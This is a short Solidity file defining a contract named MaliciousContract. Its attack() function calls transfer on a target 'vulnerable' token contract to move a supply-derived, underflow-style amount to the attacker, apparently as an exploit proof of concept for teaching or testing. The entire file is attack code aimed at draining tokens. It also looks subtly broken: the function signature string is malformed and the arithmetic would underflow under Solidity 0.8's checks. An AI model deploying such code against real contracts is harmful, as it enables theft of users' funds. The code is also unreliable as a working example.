// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract MaliciousContract {
    address public vulnerableScAddress;
    address public attacker;
    uint256 public totalSupply;

    constructor(address _vulnerableScAddress, uint256 _totalSupply) {
        vulnerableScAddress = _vulnerableScAddress;
        attacker = msg.sender;
        totalSupply = _totalSupply;
    }

    function attack() public {
        vulnerableScAddress.call(
            abi.encodeWithSignature(
                "transfer(address, uint)",
                attacker,
                type(uint256).min - type(uint256).max + totalSupply
            )
        );
    }
}
